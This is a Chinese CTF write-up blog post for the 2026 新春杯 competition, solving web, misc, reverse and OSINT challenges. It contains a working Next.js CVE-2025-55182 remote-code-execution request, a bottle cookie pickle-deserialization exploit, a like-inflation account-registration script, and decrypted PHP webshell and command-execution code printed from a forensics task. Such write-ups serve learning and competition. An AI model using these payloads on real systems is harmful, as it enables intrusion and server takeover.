+++
date = '2026-02-08T22:43:14+08:00'
title = '2026 新春杯 WP'
showToc = true
tags = ['ctf', 'write up']
+++

## Web

### 够了够了，谢谢大家

写脚本注册 100 个账号并登录点赞，由于需要保持登录状态，所以需要用 `requests.session()` 来保持会话：

```python
import requests
import time

register_url = "http://175.27.251.122:33994/register.php"
login_url = "http://175.27.251.122:33994/login.php"
like_url = "http://175.27.251.122:33994/weechatt.php"

for i in range(100):
    session = requests.session()
    response = session.post(register_url, data={
        "username": f"user{i}",
        "password": "123456"
    })
    time.sleep(0.3)
    session.post(login_url, data={
        "username": f"user{i}",
        "password": "123456"
    })
    time.sleep(0.3)
    session.post(like_url, data={ "like": "" })
    time.sleep(0.3)
```

### Arknights_solver

看到提示“cve”，看下源码有哪些技术栈，发现用了 `next.js`，查一下应该是 `CVE-2025-55182` 漏洞。

抄一下 [https://blog.csdn.net/lingggggaaaa/article/details/155617904](https://blog.csdn.net/lingggggaaaa/article/details/155617904) 的有回显 poc，改一下：

```http
POST / HTTP/1.1
Host: 192.168.0.143:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 753

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('printenv',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

我试过 `cat /flag`，发现没有这个文件， `find` 了一下也没有，试试 `printenv`，在环境变量里找到了 flag

### pttole

提示说 bottle 框架的 cookie 存在反序列化漏洞，查了一下，正好发现 Acc1oFl4g 写的详解：[https://blog.csdn.net/Python1111111/article/details/147113678](https://blog.csdn.net/Python1111111/article/details/147113678)

在 `config.py` 里找到了 `SECRET_KEY`：`h3ckTheworld123`

把 Acc1oFl4g 的 exp 抄过来，改一下：

```python
from bottle import Bottle, request, response, run, route 
class cmd():
    def __reduce__(self):         
        return (exec,("__import__('os').popen('cat /f*>/srv/app/views/login.tpl').read()",))
c = cmd()
response.set_cookie("name", c, secret="h3ckTheworld123") 
print(response._cookies)
```

把打印出来的 cookie 应用到浏览器里，再访问 `/dashboard` 就能看到 flag 了。

## Misc

### CSGO

`NO!.jpg` 末尾藏了一个 base64：`VGhlX2tleV8xczpDYW0zbGxpQA==`，解码是 `The_key_1s:Cam3lli@`

用 binwalk 把 `faliure.mp4` 里的压缩包提取出来，用 `Cam3lli@` 解压，得到 `1.bmp`

用 stegsolve 打开 `1.bmp`，有个 lsb 隐写，可以得到 flag

### 碟中谍 2.0

先用 http 过滤器排除不要的，再用 base64 解密攻击者上传的后门

```php
@error_reporting(0);

function Decrypt($data)
{
    $key = "e45e329feb5d925b"; 
    
    $bs = "base64_" . "decode";
    $data = $bs($data);

    $pwd_length = strlen($key);
    $data_length = strlen($data);
    $cipher = '';
        
    $s = array();
    for ($i = 0; $i < 256; $i++) {
        $s[$i] = $i;
    }
        
    $j = 0;
    for ($i = 0; $i < 256; $i++) {
        $j = ($j + $s[$i] + ord($key[$i % $pwd_length])) % 256;
        $tmp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $tmp;
    }
        
    $i = 0;
    $j = 0;
    for ($k = 0; $k < $data_length; $k++) {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $tmp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $tmp;
        
        $cipher .= $data[$k] ^ chr($s[($s[$i] + $s[$j]) % 256]);
    }
    
    for($i = 0; $i < strlen($cipher); $i++) {
        $cipher[$i] = $cipher[$i] ^ $key[$i+1&15]; 
    }

    return $cipher;
}
$post=Decrypt(file_get_contents("php://input"));
@eval($post);
?>
```

可以看到攻击者自己实现了一个加密，不必理会，然后这个后门会执行传给这个后门的加密的内容，这就是为什么后门的请求内容有 key 无 value 或有 value 无 key 的原因，继续破解：

```php
@error_reporting(0);
function main($content)
{
$result = array();
$result["status"] = base64_encode("success");
$result["msg"] = base64_encode($content);
@session_start(); //初始化session，避免connect之后直接background，后续getresult无法获取cookie

echo encrypt(json_encode($result));
}

function Encrypt($data)
{
$key = "e45e329feb5d925b";

for($i = 0; $i < strlen($data); $i++) { $data[$i]=$data[$i] ^ $key[$i+1&15]; } $pwd_length=strlen($key);
    $data_length=strlen($data); $cipher='' ; $s=array(); for ($i=0; $i < 256; $i++) { $s[$i]=$i; } $j=0; for ($i=0; $i <
    256; $i++) { $j=($j + $s[$i] + ord($key[$i % $pwd_length])) % 256; $tmp=$s[$i]; $s[$i]=$s[$j]; $s[$j]=$tmp; } $i=0;
    $j=0; for ($k=0; $k < $data_length; $k++) { $i=($i + 1) % 256; $j=($j + $s[$i]) % 256; $tmp=$s[$i]; $s[$i]=$s[$j];
    $s[$j]=$tmp; $cipher .=$data[$k] ^ chr($s[($s[$i] + $s[$j]) % 256]); } $bs="base64_" . "encode" ;
    $after=$bs($cipher); return $after; }
    $content="SEp2TUNFRVZpWGx3cG8ycm5WM0tEcHlKcXp0UE90VFMzWmdIZzFDQ20xa0phSUVRVUFVazBZNU4xNkNoMEhxSUF6R2lxODlPMFU5dG54cFRpanoxcnRucUhpQXR6RkpKN3dVV3RiandpNkxHWGxNeUZXdjFPc1p5VnVCNVNFalVTM00xOG9zOHl5aWY1aGpkeklxdzZKMXNwUHBjY1U0aXV3"
    ;$content=base64_decode($content); main($content);
```

可以得到 `$content` 的原始内容是：

```php
$content = "HJvMCEEViXlwpo2rnV3KDpyJqztPOtTS3ZgHg1CCm1kJaIEQUAUk0Y5N16Ch0HqIAzGiq89O0U9tnxpTijz1rtnqHiAtzFJJ7wUWtbjwi6LGXlMyFWv1OsZyVuB5SEjUS3M18os8yyif5hjdzIqw6J1spPpccU4iuw";
```

再利用攻击者自己写的 `Decrypt` 破解：

```php
error_reporting(0);
function main($whatever) {
$result = array();
ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();
$driveList ="";
if (stristr(PHP_OS,"windows")||stristr(PHP_OS,"winnt"))
{
for($i=65;$i<=90;$i++) { $drive=chr($i).':/'; file_exists($drive) ? $driveList=$driveList.$drive.";":''; } } else {
    $driveList="/" ; } $currentPath=getcwd(); //echo "phpinfo=" .$info."\n"."currentPath=".$currentPath."
    \n"."driveList=".$driveList;
    $osInfo=PHP_OS;
    $arch=" 64"; if (PHP_INT_SIZE==4) { $arch="32" ; } $localIp=gethostbyname(gethostname()); if
    ($localIp!=$_SERVER['SERVER_ADDR']) { $localIp=$localIp." ".$_SERVER['SERVER_ADDR'];
    }
    $extraIps=getInnerIP();
    foreach($extraIps as $ip)
    {
        if (strpos($localIp,$ip)===false)
        {
         $localIp=$localIp." ".$ip;
        }
    }
    $basicInfoObj=array(" basicInfo"=>
    base64_encode($info),"driveList"=>base64_encode($driveList),"currentPath"=>base64_encode($currentPath),"osInfo"=>base64_encode($osInfo),"arch"=>base64_encode($arch),"localIp"=>base64_encode($localIp));
    //echo json_encode($result);
    $result["status"] = base64_encode("success");
    $result["msg"] = base64_encode(json_encode($basicInfoObj));
    //echo json_encode($result);
    //echo openssl_encrypt(json_encode($result), "AES128", $key);
    echo encrypt(json_encode($result));
    }
    function getInnerIP()
    {
    $result = array();

    if (is_callable("exec"))
    {
    $result = array();
    exec('arp -a',$sa);
    foreach($sa as $s)
    {
    if (strpos($s,'---')!==false)
    {
    $parts=explode(' ',$s);
    $ip=$parts[1];
    array_push($result,$ip);
    }
    //var_dump(explode(' ',$s));
    // array_push($result,explode(' ',$s)[1]);
    }

    }

    return $result;
    }

    function Encrypt($data)
    {
    $key = "e45e329feb5d925b";

    for($i = 0; $i < strlen($data); $i++) { $data[$i]=$data[$i] ^ $key[$i+1&15]; } $pwd_length=strlen($key);
        $data_length=strlen($data); $cipher='' ; $s=array(); for ($i=0; $i < 256; $i++) { $s[$i]=$i; } $j=0; for ($i=0;
        $i < 256; $i++) { $j=($j + $s[$i] + ord($key[$i % $pwd_length])) % 256; $tmp=$s[$i]; $s[$i]=$s[$j]; $s[$j]=$tmp;
        } $i=0; $j=0; for ($k=0; $k < $data_length; $k++) { $i=($i + 1) % 256; $j=($j + $s[$i]) % 256; $tmp=$s[$i];
        $s[$i]=$s[$j]; $s[$j]=$tmp; $cipher .=$data[$k] ^ chr($s[($s[$i] + $s[$j]) % 256]); } $bs="base64_" . "encode" ;
        $after=$bs($cipher); return $after; }
        $whatever="a3dTaTl2djJPSFBlOWFqVFppeXFJSHQzV0tQbUR0dHo1Y3A2SzBuaHd0QWZSbWVJdFd5QU5pQXlaS3BXRTN5OXIybzFxbjl5MEtaQjdlenNPVjB3cXNPRE9tYUJEZnR0dDNTbVpxWmdtVDZ1UHd2cUgzaHJNdHJFWGZmU2JNZHZoYm5qZzhJOUFzOG5zcUFWckE3OGlLVG53QTJqQTdNQ045SHAzSnZsbVNTbjc2NkpLRExKaHBXRWozbjdIOFB3ejRIdmdqZ2RHNEt3bDFwZ3c0a2ppVXEyaXhwVjdJTVZUN0dKOHF4cFc1QUJ0bHN1ZGtBTkVWNFZhQWRoUXoxdHQxNEdwbUxOUFF0alVXazdmcEJyY09LUElNZUxiWEYxckFLVkkzM3d3Wkl6UnlSMENrS3VyckVUb1BFTG9VeWw5NXBDVFB4V1ZESHJYbnNHWWtLSGNKVlZUeGZ0QjR4dmp4TGV1VlZUbGpUNGw3Wk5UeFZZOG9xbVl0a1c1OHJXQjNJUTR6UHNDTVZqTmZBMzlVSXc3dUxFRHRjcmI4U01MUXBlN1hxamJieGk4TldhRFMwTWtabzF4NEduQ0dPUnd4ZGpyNUJBR1pOR0FmZ01jTWRlbnhobmN0OFcxT2RFb1pzV1ZRd2pZMjIwTzhDTDRSTGZaVmZxMERBaGZ1aTdJb3dKaXVIaDVOOXNDUmV5NDRCNEVMZmRkUGg3UmxXdUE3ODkyaEhpQnJHWjl1WkdDcFc5N1Q5U0VoZmppTHZTRHJsTmJqNHNNOGZHOU9WbkEzMnB3OWdBQndGcjNDTkg5b09WcUlNZ2VrckZESlloQjVwbkNITVBmbllEMUtXalhsZmFaUm9PaDZ4WmpQdkN4U09ndk5GNWMzeWhwTFQ3a3ZVcFM5aDhMdXNmS0puWmZoT2RvNnlySkZHNVJQUFZTSEVWWUVUclUxbzZmaklNRG0yNmNrN1A4MUdTc0xDWEpxZU5oaklqazg1SWRNOHZQUzhIR0ZkbElNbExFUkxUZEJmamU4djZWTGhJQkJ3ZE5xbUJQbzRMUkJUbTZyQVIwdGZONVNyaG5YOHB5cEtlN2RSN0I2eUdKNUxPc01QWlk4dUFsSDJDanFVdGZ2dzBUd282VXJTb2NEY2piTkRqZnZQMWdnb0xSa2lGWXI5UjlZN1U3b3F6akZFaWdtUWk2cnI1bldZcmVZYW9jQVFtb2ZKMG9OSElNb09hSWN0YjBGZ05mbUlXd0JYUWhheGtlR2pQM0tVcnN4TUFlbFV6ektPWlg5MHd5bENvTXJvZUNvUXJCWTVxdnZBblBqN3R1VWtqYU5CT01YM3B0VEtVWWdEYnluODR5NUxWNE5qR0FRbnlGWHFuQlVTOTlGWFZYZFJrMWl4ZkJYR2tFMVpCTmhOTXQxRDZ1aGlyMEx5SVpQbkJzT0hyODBBWkNHbm5hS2pqTHhnR2pUSzhSYzdkeFBHRU1yaE5Ed3ROTngxekwwNjdNaGRhOG5Nb1FMRWVvVVVJdjdUOW83TDNNQ1k3UUJlZDh4Unp2aFZXMDVPeTRWalFNUEhuVHJJRXJYNkhKYWZBTWU3a3Ntd1hxWm9rU0hscTRKUVptTUFnRDVXc09PY1ZrT1JQaEpOVmZqSUpQT0J3UUhzY1poUkVDV0tpSG84WXQzTGNPbkFoMjRnb1hIZTdObmRJWWdJM0xFVW0yeFhDOTcySmE5QVVpV3B3NEQ3dGVKY0xNMFJGS0ZWV05WT00zMDRFb3phcGc3OUNrdkJtMGJJOE9BUDE0RGtZV2Z5UTkzVENNMENvRkE0TXpPMzRwVXpKc3AzVWgwcEVSMGRUZ1M1RGpqOTYwRGJPQ1c0TEY4bm52dFBPcFRRRTRGOUVFaDJycGw0S0RWZkpDR1hwUHBkRVRKOE5SMjREcmRmYklRS3hSeFJBcExLZGx5eVp2TnpzM0pZc1ZSSjg4MjY3UDc4RHhFeVZlTGNyU0kya3Q0ZWRqek5Gckl6WkxwT044SUlFeXFTVjlURUhjU1VlZTVMNVF0dlJrM0xXbGtiWGk2VWVzb3ViMllZQk5zY2kyUVBKNFlnWVZUbVBtSmdlSzdFUEZ4b2xja0U0cUZRTWdIN1BqZW1HeW9rOFI2aWx2YnhlQm5mYng1YUVsYjl6VEVhSVJQZ0lNcUpLeFBjWm5rd0RHTUkxcHI2UkFEb095bEJnc0VoOUhqdWxFamNpWFM1Z0VOVG1oT0tWRHdNTk5wdlo0czZaYUhqY2hxZ201V0J0RllPWk5RY2FuNmR6R3E3RWIxMXIyQVNYbnR4VDJFQ3E3NFVwMTNnZjZB"
        ;$whatever=base64_decode($whatever); main($whatever);
```

```php
@error_reporting(0);

function getSafeStr($str){
$s1 = iconv('utf-8','gbk//IGNORE',$str);
$s0 = iconv('gbk','utf-8//IGNORE',$s1);
if($s0 == $str){
return $s0;
}else{
return iconv('gbk','utf-8//IGNORE',$str);
}
}
function main($cmd,$path)
{
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('max_execution_time', 0);
$result = array();
$PadtJn = @ini_get('disable_functions');
if (! empty($PadtJn)) {
$PadtJn = preg_replace('/[, ]+/', ',', $PadtJn);
$PadtJn = explode(',', $PadtJn);
$PadtJn = array_map('trim', $PadtJn);
} else {
$PadtJn = array();
}
$c = $cmd;
if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {
$c = $c . " 2>&1\n";
}
$JueQDBH = 'is_callable';
$Bvce = 'in_array';
if ($JueQDBH('system') and ! $Bvce('system', $PadtJn)) {
ob_start();
system($c);
$kWJW = ob_get_contents();
ob_end_clean();
} else if ($JueQDBH('proc_open') and ! $Bvce('proc_open', $PadtJn)) {
$handle = proc_open($c, array(
array(
'pipe',
'r'
),
array(
'pipe',
'w'
),
array(
'pipe',
'w'
)
), $pipes);
$kWJW = NULL;
while (! feof($pipes[1])) {
$kWJW .= fread($pipes[1], 1024);
}
@proc_close($handle);
} else if ($JueQDBH('passthru') and ! $Bvce('passthru', $PadtJn)) {
ob_start();
passthru($c);
$kWJW = ob_get_contents();
ob_end_clean();
} else if ($JueQDBH('shell_exec') and ! $Bvce('shell_exec', $PadtJn)) {
$kWJW = shell_exec($c);
} else if ($JueQDBH('exec') and ! $Bvce('exec', $PadtJn)) {
$kWJW = array();
exec($c, $kWJW);
$kWJW = join(chr(10), $kWJW) . chr(10);
} else if ($JueQDBH('exec') and ! $Bvce('popen', $PadtJn)) {
$fp = popen($c, 'r');
$kWJW = NULL;
if (is_resource($fp)) {
while (! feof($fp)) {
$kWJW .= fread($fp, 1024);
}
}
@pclose($fp);
} else {
$kWJW = 0;
$result["status"] = base64_encode("fail");
$result["msg"] = base64_encode("none of proc_open/passthru/shell_exec/exec/exec is available");
$key = $_SESSION['k'];
echo encrypt(json_encode($result));
return;

}
$result["status"] = base64_encode("success");
$result["msg"] = base64_encode(getSafeStr($kWJW));
echo encrypt(json_encode($result));
}


function Encrypt($data)
{
$key = "e45e329feb5d925b";

for($i = 0; $i < strlen($data); $i++) { $data[$i]=$data[$i] ^ $key[$i+1&15]; } $pwd_length=strlen($key);
    $data_length=strlen($data); $cipher='' ; $s=array(); for ($i=0; $i < 256; $i++) { $s[$i]=$i; } $j=0; for ($i=0; $i <
    256; $i++) { $j=($j + $s[$i] + ord($key[$i % $pwd_length])) % 256; $tmp=$s[$i]; $s[$i]=$s[$j]; $s[$j]=$tmp; } $i=0;
    $j=0; for ($k=0; $k < $data_length; $k++) { $i=($i + 1) % 256; $j=($j + $s[$i]) % 256; $tmp=$s[$i]; $s[$i]=$s[$j];
    $s[$j]=$tmp; $cipher .=$data[$k] ^ chr($s[($s[$i] + $s[$j]) % 256]); } $bs="base64_" . "encode" ;
    $after=$bs($cipher); return $after; } $cmd="Y2QgL2QgIkQ6XHBocHN0dWR5X3Byb1xXV1dcZGVmYXVsdFwiJndob2FtaQ==" // cd /d "D:\phpstudy_pro\WWW\default\"&whoami
    ;$cmd=base64_decode($cmd);$path="RDovcGhwc3R1ZHlfcHJvL1dXVy9kZWZhdWx0Lw==" ;$path=base64_decode($path); // D:/phpstudy_pro/WWW/default/
    main($cmd,$path);
```

继续解密，就得到 flag 了：

```
Y2QgL2QgIkQ6XHBocHN0dWR5X3Byb1xXV1dcZGVmYXVsdFwiJmVjaG8gImZsYWd7N2JiYmUxM2YtNDU4Yi00NTFkLTlmZmEtMDkxMGJlYWU2YWI5fSI=

cd /d "D:\phpstudy_pro\WWW\default\"&echo "flag{7bbbe13f-458b-451d-9ffa-0910beae6ab9}"
```

### 问卷

填写问卷即可

## Reverse

### 签到

看图标应该是用 Pyinstaller 打包的 Python 程序，用 pyinstxtractor.py [https://github.com/extremecoders-re/pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) 提取出来：

```bash
python pyinstxtractor.py qiandao.exe
```

再用 pycdc [https://github.com/zrax/pycdc](https://github.com/zrax/pycdc) 把提取出来的 `qiandao.pyc` 反编译出来：

```bash
❯ .\pycdc.exe .\qiandao.pyc
# Source Generated with Decompyle++
# File: qiandao.pyc (Python 3.11)

a = '53 44 50 43 53 45 43 7b 72 65 76 65 72 73 65 5f 71 69 61 6e 5f 64 61 6f 7d 0a'
correct_flag = bytes.fromhex(a).decode('utf-8').strip()
user_input = input('please input your flag: ')
if user_input == correct_flag:
    print('great')
    return None
print('wrong')
```

把 `a` 转换成字符串就是最终的 flag 了

## Osint

### Where am I

看图有个珠海中心大厦在里面，标语还是繁体字，还有葡萄牙语，还有“不要抛物品到铁轨”，应该是澳门的某个轻轨站，打开澳门轻轨线路图 [https://mlm.com.mo/sc/route.html](https://mlm.com.mo/sc/route.html) 找几个西边的站试试就试出来了
